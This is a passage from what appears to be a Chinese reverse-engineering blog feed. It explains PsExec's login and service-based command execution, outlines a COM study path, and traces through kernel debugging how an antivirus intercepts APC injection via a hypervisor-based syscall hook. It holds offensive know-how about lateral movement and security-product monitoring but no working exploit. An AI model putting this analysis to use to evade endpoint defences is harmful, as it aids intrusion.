&lt;h2 id=&quot;psexec的登录过程&quot;&gt;psexec的登录过程&lt;/h2&gt;

&lt;p&gt;https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session&lt;/p&gt;

&lt;p&gt;使用函数WNetAddConnection2W通过ipc$共享登录到目标计算机&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210224110927413.png&quot; alt=&quot;image-20210224110927413&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;psexec如何在目标系统上执行命令&quot;&gt;psexec如何在目标系统上执行命令&lt;/h2&gt;

&lt;p&gt;psexec自身携带了psexesvc，在登录后会将psexesvc通过admin$共享将psexesvc拷贝过去&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210224111039427.png&quot; alt=&quot;image-20210224111039427&quot; /&gt;&lt;/p&gt;

&lt;p&gt;​	查看psexec的资源表，可以发现附带的psexecsvc程序&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210224111153742.png&quot; alt=&quot;image-20210224111153742&quot; /&gt;&lt;/p&gt;

&lt;p&gt;之后打开目标系统上的服务管理器，创建psexesvc的服务并启动。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210224111351331.png&quot; alt=&quot;image-20210224111351331&quot; /&gt;&lt;/p&gt;

&lt;p&gt;之后使用命名管道来与psexesvc进行通信，向psexesvc发送指令来执行命令&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210224111747076.png&quot; alt=&quot;image-20210224111747076&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;psexesvc以什么身份账户在目标系统上执行&quot;&gt;psexesvc以什么身份（账户）在目标系统上执行&lt;/h2&gt;

&lt;p&gt;psexecsvc是以服务的身份启动的，因此如果执行命令，那就是以服务的身份执行。可实际上使用时我们知道，我们是以通过命令行传入psexec的账户的身份执行的&lt;/p&gt;

&lt;p&gt;这是如何做到的？&lt;/p&gt;

&lt;p&gt;在发送指令的包中，psexec会同时将用户传入的凭据发送给psexesvc&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210224112856530.png&quot; alt=&quot;image-20210224112856530&quot; /&gt;&lt;/p&gt;

&lt;p&gt;psexecsvc使用LogonUserExExW进行登录，获取一个目标账户的token&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210224113040740.png&quot; alt=&quot;image-20210224113040740&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接着使用CreateProcessAsUser，通过已获取的token来以目标账户的身份登录&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210224113336005.png&quot; alt=&quot;image-20210224113336005&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;在学习的时候发现了一个开源版本的psexec https://github.com/poweradminllc/PAExec&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;终于向内网前进了一点&lt;/li&gt;
  &lt;li&gt;还是那句话，想要更好的使用工具或者开发自己的工具就需要深入了解其内部的机制&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="reverse-engineering" /><summary type="html">psexec是后渗透的常用工具，拥有一个目标系统的账户后我们可以通过它在目标系统执行命令。但是它是如何工作的？这篇文章将记录我的研究过程。</summary></entry><entry><title type="html">COM学习</title><link href="https://citrusice.github.io/posts/studying-com/" rel="alternate" type="text/html" title="COM学习" /><published>2021-02-12T18:21:48+08:00</published><updated>2021-02-12T18:21:48+08:00</updated><id>https://citrusice.github.io/posts/studying-com</id><content type="html" xml:base="https://citrusice.github.io/posts/studying-com/">&lt;p&gt;com不是什么新的东西，主要是写一下学习路径&lt;/p&gt;

&lt;h2 id=&quot;类&quot;&gt;类&lt;/h2&gt;

&lt;p&gt;回答以下几个问题&lt;/p&gt;

&lt;p&gt;类在内存中的样子？&lt;/p&gt;

&lt;p&gt;类对象在内存中的样子？&lt;/p&gt;

&lt;p&gt;多态底层怎么实现？为什么基类指针指向派生类对象就能实现多态？底层是怎么做的？&lt;/p&gt;

&lt;p&gt;构造函数可以为虚函数吗？如果构造函数为虚函数，能够实现多态吗？为什么？&lt;/p&gt;

&lt;p&gt;析构函数可以为虚函数吗？为什么？&lt;/p&gt;

&lt;p&gt;如果派生类不重写虚函数， 基类指针指向派生类对象，调用的是谁的虚函数？&lt;/p&gt;

&lt;h2 id=&quot;认识com组件&quot;&gt;认识COM组件&lt;/h2&gt;

&lt;p&gt;com有in-proc与out-proc两种形态&lt;/p&gt;

&lt;p&gt;使用c/c++编写inproc com组件&lt;/p&gt;

&lt;p&gt;编写outproc组件&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;了解idl、alt&lt;/li&gt;
  &lt;li&gt;使用alt实现out-proc com&lt;/li&gt;
  &lt;li&gt;不使用alt实现out-proc com&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;localserver-com如何通信&quot;&gt;localserver com如何通信&lt;/h2&gt;

&lt;p&gt;基于rpc&lt;/p&gt;

&lt;p&gt;编写RPC helloworld&lt;/p&gt;

&lt;h2 id=&quot;vbs如何获取到类函数地址&quot;&gt;vbs如何获取到类函数地址&lt;/h2&gt;

&lt;p&gt;对于脚本语言来说，他无法获取到目标类函数在虚表中的位置，那么com组件通过什么样的方式来实现”语言无关”呢？&lt;/p&gt;

&lt;p&gt;了解IDispatch&lt;/p&gt;

&lt;p&gt;了解typelib&lt;/p&gt;

&lt;h2 id=&quot;marshaling&quot;&gt;Marshaling&lt;/h2&gt;

&lt;h2 id=&quot;dcom&quot;&gt;DCOM&lt;/h2&gt;

&lt;p&gt;https://saravanesh.files.wordpress.com/2007/09/understanding-com.pdf&lt;/p&gt;

&lt;h2 id=&quot;dll-surrogate&quot;&gt;dll surrogate&lt;/h2&gt;

&lt;p&gt;https://docs.microsoft.com/en-us/windows/win32/com/registering-the-dll-server-for-surrogate-activation&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;ole、activex、winrt、.net，com是这些东西的基础，在了解了com之后再去学习这些微软的技术、框架会变得更加轻松&lt;/p&gt;</content><author><name></name></author><category term="develop" /><summary type="html">com不是什么新的东西，主要是写一下学习路径</summary></entry><entry><title type="html">我们的程序如何被监控</title><link href="https://citrusice.github.io/posts/how-is-our-program-monitored/" rel="alternate" type="text/html" title="我们的程序如何被监控" /><published>2021-01-14T12:29:42+08:00</published><updated>2021-01-14T12:29:42+08:00</updated><id>https://citrusice.github.io/posts/how-is-our-program-monitored</id><content type="html" xml:base="https://citrusice.github.io/posts/how-is-our-program-monitored/">&lt;p&gt;ring3下，杀软对程序无非就是各种iat hook、inline hook；在ring0由于有pg的出现，杀软厂商们不得不放弃原来使用的hook而使用微软提供的内核回调&lt;/p&gt;

&lt;p&gt;我所知道的回调大概有这些&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;进程创建回调&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;线程创建回调&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;模块加载回调&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;注册表回调&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;文件监控回调&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;网络监控回调&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这些内核回调函数对于程序行为的监控基本是很完全了，但是还不够，是有很多盲点的。聪明的黑客们也早已想到了很多办法，其中apc注入就是一种最为典型的来绕过这些内核回调监控的方法，早已被滥用于许多木马中。&lt;/p&gt;

&lt;p&gt;既然在ring0无法使用回调的方式监控apc注入，有些杀毒软件厂商就将hook位置从内核拿到用户态。ring3下hook的好处是简单、稳定，纵使hook出现了问题也最多是程序崩溃而不会影响全局，而缺点也是显而易见的——容易被绕过、摘除&lt;/p&gt;

&lt;p&gt;那么这是否意味着我们只要绕过了ring3下的hook，apc注入便可以成为一种难以被察觉的进程注入手段呢？答案肯定是否定的，只要对apc注入进行过测试就会知道这种方式是会被拦截的。但是杀软是如何监控到的呢？带着这个问题，我开始了探索，并写这篇文章来简要记录。&lt;/p&gt;

&lt;p&gt;首先写一个简单的apc注入器，在安装了杀软的环境中进行注入&lt;/p&gt;

&lt;p&gt;尽管知道不会是ring3下的hook，但是保险起见，一直跟入到syscall&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20201214171817590.png&quot; alt=&quot;image-20201214171817590&quot; /&gt;&lt;/p&gt;

&lt;p&gt;没有hook&lt;/p&gt;

&lt;p&gt;接下来我们要进入内核一探究竟，syscall是进入内核的指令，根据手册，syscall指令会从msr的lstar（0xC0000082）中读取地址作为rip&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; rdmsr c0000082
msr[c0000082] = fffff800`0dc116c0
0: kd&amp;gt; u fffff800`0dc116c0
nt!KiSystemCall64:
fffff800`0dc116c0 0f01f8          swapgs
fffff800`0dc116c3 654889242510000000 mov   qword ptr gs:[10h],rsp
fffff800`0dc116cc 65488b2425a8010000 mov   rsp,qword ptr gs:[1A8h]
fffff800`0dc116d5 6a2b            push    2Bh
fffff800`0dc116d7 65ff342510000000 push    qword ptr gs:[10h]
fffff800`0dc116df 4153            push    r11
fffff800`0dc116e1 6a33            push    33h
fffff800`0dc116e3 51              push    rcx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到其中的地址指向了nt!KiSystemCall64，于是在这里下断，运行，程序并没有被断住。&lt;/p&gt;

&lt;p&gt;到这里就卡住了，我之前从未对这里下过断点，仅仅知道这个函数大概会根据ssdt找到NtQueueApcThread对应的内核函数并调用，我也想不出任何关于调试器无法在这里下断的原因，尽管我可以静态分析来查看杀软是否对这里进行了hook，但此时我更想知道这到底是怎么一回事。&lt;/p&gt;

&lt;p&gt;经过两天的研究事情终于有了一些眉目，在正常的情况下对nt!KiSystemCall64下断点会导致BSOD，而我这里由于杀软做了某些操作导致无事发生。nt!KiSystemCall64的前三条指令设置了gs寄存器以及内核栈，而windbg的调试实际上是依赖于windows内核的，windbg做的只不过是通过串口与内核进行交互，因此在已经进入了ring0但内核栈没有设置正确的情况下触发异常会导致蓝屏。那为什么在安装了杀软的环境中断点没有生效呢？一种情况是可能cpu根本没有运行那些指令，而是绕开了断点走了其他的地方，又或者是杀软可能对一些debug函数进行了hook阻碍了我的调试。&lt;/p&gt;

&lt;p&gt;为了检查杀软确实没有在nt!KiSystemCall64中hook，只能静态看一下了，把这个函数的内存dump下来比较一下&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;diff&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\av.dump&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\no-av.dump&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputObject&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SideIndicator&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-----------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-------------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\no-av.dump&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\av.dump&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;内容是一致的&lt;/p&gt;

&lt;p&gt;从系统调用的入口没办法继续跟进，那就只能从出口入手了。&lt;/p&gt;

&lt;p&gt;首先要检查的是ssdt中的内容是否有被更改，从ntdll!NtQueueApcThread中可以看到，他的调用号是45h&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; u nt!KiServiceTable+(dwo(nt!KiServiceTable+(4*45))&amp;gt;&amp;gt;4)
nt!NtQueueApcThread:
fffff802`36a962a0 4883ec38        sub     rsp,38h
fffff802`36a962a4 488b442460      mov     rax,qword ptr [rsp+60h]
fffff802`36a962a9 4889442428      mov     qword ptr [rsp+28h],rax
fffff802`36a962ae 4c894c2420      mov     qword ptr [rsp+20h],r9
fffff802`36a962b3 4d8bc8          mov     r9,r8
fffff802`36a962b6 4c8bc2          mov     r8,rdx
fffff802`36a962b9 33d2            xor     edx,edx
fffff802`36a962bb e810000000      call    nt!NtQueueApcThreadEx (fffff802`36a962d0)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ssdt表是正常的，没有被修改&lt;/p&gt;

&lt;p&gt;在nt!NtQueueApcThread下断，让程序跑起来，等待程序断下后查看调用堆栈&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; 
Breakpoint 2 hit
nt!NtQueueApcThread:
0010:fffff802`36a962a0 4883ec38        sub     rsp,38h
0: kd&amp;gt; k
 # Child-SP          RetAddr               Call Site
00 fffffd05`75cf2918 fffff802`3a2b34db     nt!NtQueueApcThread
01 fffffd05`75cf2920 ffffe60e`35f67080     0xfffff802`3a2b34db 奇怪的调用者
02 fffffd05`75cf2928 00000000`00000016     0xffffe60e`35f67080
03 fffffd05`75cf2930 fffffd05`75cf2950     0x16
04 fffffd05`75cf2938 00000202`6fdb0000     0xfffffd05`75cf2950
05 fffffd05`75cf2940 00000000`00000000     0x00000202`6fdb0000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;与正常的调用作比较&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; k
 # Child-SP          RetAddr               Call Site
00 ffff920b`14837a88 fffff800`0dc11bb5     nt!NtQueueApcThread
01 ffff920b`14837a90 00007ffe`27fac644     nt!KiSystemServiceCopyEnd+0x25
02 000000e6`96cff598 00007ffe`258a137f     ntdll!NtQueueApcThread+0x14
03 000000e6`96cff5a0 00007ff6`5f1d95d8     KERNELBASE!QueueUserAPC+0x8f
04 000000e6`96cff600 00000000`00000000     xxxx!inject+0x4d8 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到杀软对我们的hook&lt;/p&gt;

&lt;p&gt;分析这个hook函数&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;0010:fffff802`3a2b3428 4c8bdc           mov     r11, rsp ;函数起始位置，栈指针存入r11
0010:fffff802`3a2b342b 49895b08         mov     qword ptr [r11+8], rbx ; 存rbx
0010:fffff802`3a2b342f 49897310         mov     qword ptr [r11+10h], rsi; 存rsi
0010:fffff802`3a2b3433 57               push    rdi
0010:fffff802`3a2b3434 4881ec60010000   sub     rsp, 160h
0010:fffff802`3a2b343b 488b842490010000 mov     rax, qword ptr [rsp+190h]
0010:fffff802`3a2b3443 48894c2430       mov     qword ptr [rsp+30h], rcx
0010:fffff802`3a2b3448 0fb70dbd540600   movzx   ecx, word ptr [fffff802`3a31890c]
0010:fffff802`3a2b344f 4889442450       mov     qword ptr [rsp+50h], rax
0010:fffff802`3a2b3454 498d4328         lea     rax, [r11+28h]
0010:fffff802`3a2b3458 4c89442440       mov     qword ptr [rsp+40h], r8
0010:fffff802`3a2b345d 4889442428       mov     qword ptr [rsp+28h], rax
0010:fffff802`3a2b3462 4c894c2448       mov     qword ptr [rsp+48h], r9
0010:fffff802`3a2b3467 488d442460       lea     rax, [rsp+60h]
0010:fffff802`3a2b346c 4889542438       mov     qword ptr [rsp+38h], rdx
0010:fffff802`3a2b3471 4d8d8b78ffffff   lea     r9, [r11-88h]
0010:fffff802`3a2b3478 4c8d442430       lea     r8, [rsp+30h]
0010:fffff802`3a2b347d ba16000000       mov     edx, 16h
0010:fffff802`3a2b3482 4889442420       mov     qword ptr [rsp+20h], rax
0010:fffff802`3a2b3487 e87852ffff       call    fffff802`3a2a8704
0010:fffff802`3a2b348c 8bd8             mov     ebx, eax
0010:fffff802`3a2b348e 3d030500c0       cmp     eax, 0C0000503h
0010:fffff802`3a2b3493 7504             jne     fffff802`3a2b3499
0010:fffff802`3a2b3495 33db             xor     ebx, ebx
0010:fffff802`3a2b3497 eb45             jmp     fffff802`3a2b34de
0010:fffff802`3a2b3499 85c0             test    eax, eax
0010:fffff802`3a2b349b 7841             js      fffff802`3a2b34de
0010:fffff802`3a2b349d 488b157c550600   mov     rdx, qword ptr [fffff802`3a318a20] ;rdx指向nt!KeServiceDescriptorTable
0010:fffff802`3a2b34a4 0fb70d61540600   movzx   ecx, word ptr [fffff802`3a31890c] ;调用号
0010:fffff802`3a2b34ab 4c8b4c2448       mov     r9, qword ptr [rsp+48h]
0010:fffff802`3a2b34b0 488b02           mov     rax, qword ptr [rdx] ;rax指向了ssdt
0010:fffff802`3a2b34b3 4c8b442440       mov     r8, qword ptr [rsp+40h]
0010:fffff802`3a2b34b8 488b542438       mov     rdx, qword ptr [rsp+38h]
0010:fffff802`3a2b34bd 8b0c88           mov     ecx, dword ptr [rax+rcx*4];根据调用号与ssdt基地址获取了内核函数的偏移
0010:fffff802`3a2b34c0 c1f904           sar     ecx, 4 ;右移4位
0010:fffff802`3a2b34c3 4c63d1           movsxd  r10, ecx
0010:fffff802`3a2b34c6 488b4c2430       mov     rcx, qword ptr [rsp+30h]
0010:fffff802`3a2b34cb 4c03d0           add     r10, rax ;计算出目标函数地址
0010:fffff802`3a2b34ce 488b442450       mov     rax, qword ptr [rsp+50h]
0010:fffff802`3a2b34d3 4889442420       mov     qword ptr [rsp+20h], rax
0010:fffff802`3a2b34d8 41ffd2           call    r10 ;调用目标函数
0010:fffff802`3a2b34db 488bd8           mov     rbx, rax
0010:fffff802`3a2b34de 4863bc2490010000 movsxd  rdi, dword ptr [rsp+190h]
0010:fffff802`3a2b34e6 85ff             test    edi, edi
0010:fffff802`3a2b34e8 743a             je      fffff802`3a2b3524
0010:fffff802`3a2b34ea 488d34fdf8ffffff lea     rsi, [rdi*8-8]
0010:fffff802`3a2b34f2 4c8b4c3460       mov     r9, qword ptr [rsp+rsi+60h]
0010:fffff802`3a2b34f7 488d542430       lea     rdx, [rsp+30h]
0010:fffff802`3a2b34fc 4c63c3           movsxd  r8, ebx
0010:fffff802`3a2b34ff b916000000       mov     ecx, 16h
0010:fffff802`3a2b3504 ff9434e0000000   call    qword ptr [rsp+rsi+0E0h]
0010:fffff802`3a2b350b 3d030500c0       cmp     eax, 0C0000503h
0010:fffff802`3a2b3510 7504             jne     fffff802`3a2b3516
0010:fffff802`3a2b3512 33db             xor     ebx, ebx
0010:fffff802`3a2b3514 eb05             jmp     fffff802`3a2b351b
0010:fffff802`3a2b3516 85c0             test    eax, eax
0010:fffff802`3a2b3518 0f48d8           cmovs   ebx, eax
0010:fffff802`3a2b351b 4883ee08         sub     rsi, 8
0010:fffff802`3a2b351f 83c7ff           add     edi, 0FFFFFFFFh
0010:fffff802`3a2b3522 75ce             jne     fffff802`3a2b34f2
0010:fffff802`3a2b3524 4c8d9c2460010000 lea     r11, [rsp+160h]; 清栈   
0010:fffff802`3a2b352c 8bc3             mov     eax, ebx
0010:fffff802`3a2b352e 498b5b10         mov     rbx, qword ptr [r11+10h]
0010:fffff802`3a2b3532 498b7318         mov     rsi, qword ptr [r11+18h]
0010:fffff802`3a2b3536 498be3           mov     rsp, r11
0010:fffff802`3a2b3539 5f               pop     rdi ;rsp现在指向 nt!KiSystemServiceCopyEnd + 0x25 
0010:fffff802`3a2b353a c3               ret     
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看出它同样实现了KiSystemCall64的功能做了查找ssdt的工作&lt;/p&gt;

&lt;p&gt;这段函数不属于任意一个模块，而根据最后函数最后ret的地址指向 nt!KiSystemServiceCopyEnd + 0x25，这似乎意味着这个hook函数是正常从nt!KiSystemServiceCopyEnd调用过来的。但是正常情况来讲nt!KiSystemServiceCopyEnd会从原有的ssdt中取值计算出用户态syscall对应的内核函数，如果这个hook函数是由KiSystemServiceCopyEnd调用的，这也就代表杀软修改了ssdt，这就出现了矛盾。因此我猜测这个返回地址是伪造出来的，可以用这样几种方式实现&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;push nt!KiSystemServiceCopyEnd + 0x25
jmp hook_func_addr_offset

push nt!KiSystemServiceCopyEnd + 0x25
mov rax,hook_func_addr
jmp rax

push nt!KiSystemServiceCopyEnd + 0x25
push hook_func_addr_offset
ret
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;用这样的代码来调用它，我们可以伪造出调用方，防止逆向人员的逆向&lt;/p&gt;

&lt;p&gt;尝试在nt!KiSystemServiceCopyEnd设置断点，很幸运，与在KiSystemCall64设置断点不同，在这里断点可以生效。&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1: kd&amp;gt; u nt!KiSystemServiceCopyEnd
nt!KiSystemServiceCopyEnd:
fffff802`3681eb90 f705665a8f0001000000 test dword ptr [nt!KiDynamicTraceMask (fffff802`37114600)],1
fffff802`3681eb9a 0f8593040000    jne     nt!KiSystemServiceExitPico+0x1fe (fffff802`3681f033)
fffff802`3681eba0 f705de588f0040000000 test dword ptr [nt!PerfGlobalGroupMask+0x8 (fffff802`37114488)],40h
fffff802`3681ebaa 0f85f7040000    jne     nt!KiSystemServiceExitPico+0x272 (fffff802`3681f0a7)
fffff802`3681ebb0 498bc2          mov     rax,r10
fffff802`3681ebb3 ffd0            call    rax
fffff802`3681ebb5 0f1f00          nop     dword ptr [rax]
fffff802`3681ebb8 65ff0425b82e0000 inc     dword ptr gs:[2EB8h]
1: kd&amp;gt; r r10
r10=fffff8023a2b3428
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;之后的代码会调用r10中指向的函数，而r10的地址正是之前分析的hook函数的地址，看来hook函数的调用这就是nt!KiSystemServiceCopyEnd + 0x25，而并非是伪造出的。&lt;/p&gt;

&lt;p&gt;那么这个r10中的地址是怎样得到的呢，从nt!KiSystemServiceCopyEnd往上翻，我们可以找到r10的来源&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1: kd&amp;gt; u nt!KiSystemServiceRepeat  nt!KiSystemServiceGdiTebAccess
nt!KiSystemServiceRepeat:
fffff802`3681ea34 4c8d1585ae9f00  lea     r10,[nt!KeServiceDescriptorTable (fffff802`372198c0)]
fffff802`3681ea3b 4c8d1dfe5f8f00  lea     r11,[nt!KeServiceDescriptorTableShadow (fffff802`37114a40)]
fffff802`3681ea42 f7437880000000  test    dword ptr [rbx+78h],80h
fffff802`3681ea49 7413            je      nt!KiSystemServiceRepeat+0x2a (fffff802`3681ea5e)
fffff802`3681ea4b f7437800002000  test    dword ptr [rbx+78h],200000h
fffff802`3681ea52 7407            je      nt!KiSystemServiceRepeat+0x27 (fffff802`3681ea5b)
fffff802`3681ea54 4c8d1d65618f00  lea     r11,[nt!KeServiceDescriptorTableFilter (fffff802`37114bc0)]
fffff802`3681ea5b 4d8bd3          mov     r10,r11
fffff802`3681ea5e 413b443a10      cmp     eax,dword ptr [r10+rdi+10h]
fffff802`3681ea63 0f832c050000    jae     nt!KiSystemServiceExitPico+0x160 (fffff802`3681ef95)
fffff802`3681ea69 4d8b143a        mov     r10,qword ptr [r10+rdi]
fffff802`3681ea6d 4d631c82        movsxd  r11,dword ptr [r10+rax*4]
fffff802`3681ea71 498bc3          mov     rax,r11
fffff802`3681ea74 49c1fb04        sar     r11,4
fffff802`3681ea78 4d03d3          add     r10,r11
fffff802`3681ea7b 83ff20          cmp     edi,20h
fffff802`3681ea7e 7550            jne     nt!KiSystemServiceGdiTebAccess+0x49 (fffff802`3681ead0)
fffff802`3681ea80 4c8b9bf0000000  mov     r11,qword ptr [rbx+0F0h]
nt!KiSystemServiceGdiTebAccess:
fffff802`3681ea87 4183bb4017000000 cmp     dword ptr [r11+1740h],0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;从代码中可以看出，r10应该是解析了ssdt表后所指向的内核函数，而从我们调试得到的结果来看，r10指向的并非是应该指向的函数，并且ssdt表也没有被修改。&lt;/p&gt;

&lt;p&gt;继续在nt!KiSystemServiceRepeat这里下断点，发现情况与之前在KiSystemCall64下断的情况一下，断点并未生效。&lt;/p&gt;

&lt;p&gt;经过一番摸索后发现，在nt!KiSystemServiceRepeat+0x47之后的地方下断都可以生效，而在其之前都无法生效&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1: kd&amp;gt; u nt!KiSystemServiceRepeat+0x47
nt!KiSystemServiceRepeat+0x47:
fffff802`3681ea7b 83ff20          cmp     edi,20h
fffff802`3681ea7e 7550            jne     nt!KiSystemServiceGdiTebAccess+0x49 (fffff802`3681ead0)
fffff802`3681ea80 4c8b9bf0000000  mov     r11,qword ptr [rbx+0F0h]
.....
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;断在这里的时候r10已经指向hook函数&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1: kd&amp;gt; g
Breakpoint 6 hit
nt!KiSystemServiceRepeat+0x47:
0010:fffff802`3681ea7b 83ff20          cmp     edi,20h
1: kd&amp;gt; r r10
r10=fffff8023a2b3428
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;确实有点不知道如何是好了，看起来在执行syscall之后，cpu并没有来到nt!KiSystemCall64，而是走了另外的代码，最终又跳转回来。&lt;/p&gt;

&lt;p&gt;有想过把附近4gb的内存全部dump下来用ida分析看看是哪里跳过来的，但是仔细一想根本不可行，4gb内存不知道要分析多长时间，而且这4gb内存必然是不连续的，在dump过程中会访问到不可读的内存导致出错。&lt;/p&gt;

&lt;p&gt;又折腾了两三天，在查阅资料的过程中我了解到了这是一种基于vmm的hook，他修改了msr中的值，让cpu在执行syscall时跳转到它的hook函数，而当其他人读取msr寄存器中的值时会返回一个伪造的值让msr看起来并没有被修改。但是如何证明杀软确实是这么做的呢？qemu理论应该可以跟踪cpu的执行流程在执行syscall后跳到了hook函数的地址，或者直接获取msr寄存器中真实的值（纯软件模拟应该可以，但是现在qemu并非纯软件模拟了）。最后感觉自己这方面知识太少还不足以去调试vt，只好弄了个最简单的方法：在关掉了虚拟化后，在KiSystemCall64下断可以生效。这大概也算是证明了吧。&lt;/p&gt;

&lt;p&gt;基于vmm，不但可以修改msr不被发现，甚至连内存也可以伪造出来，有点想到黑客帝国了。&lt;/p&gt;

&lt;hr /&gt;

